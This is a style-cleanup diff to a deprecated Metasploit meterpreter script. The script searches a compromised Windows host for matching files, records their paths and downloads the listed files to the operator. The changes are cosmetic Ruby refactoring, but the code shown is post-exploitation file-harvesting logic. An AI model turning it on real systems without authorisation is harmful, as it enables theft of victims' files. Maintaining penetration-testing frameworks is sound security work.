@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
@@ -35,8 +35,8 @@ end
 # Check that we are running under the right type of Meterpreter
 if client.platform =~ /win32|win64/
   # Parse the options
-  if args.length > 0
-    @opts.parse(args) { |opt, idx, val|
+  if !args.empty?
+    @opts.parse(args) do |opt, _idx, val|
       case opt
       when "-h"
         usage
@@ -53,20 +53,20 @@ if client.platform =~ /win32|win64/
       when "-l"
         logs = val
       end
-    }
+    end
     # Search for files and save their location if specified
-    if search_blob.length > 0 and location
+    if !search_blob.empty? && location
       search_blob.each do |s|
         print_status("Searching for #{s}")
-        results = @client.fs.file.search(location,s,recurse)
+        results = @client.fs.file.search(location, s, recurse)
         results.each do |file|
           print_status("\t#{file['path']}\\#{file['name']} (#{file['size']} bytes)")
-          file_local_write(output_file,"#{file['path']}\\#{file['name']}") if output_file
+          file_local_write(output_file, "#{file['path']}\\#{file['name']}") if output_file
         end
       end
     end
     # Read log file and download those files found
-    if input_file and logs
+    if input_file && logs
       if ::File.exist?(input_file)
         print_status("Reading file #{input_file}")
         print_status("Downloading to #{logs}")
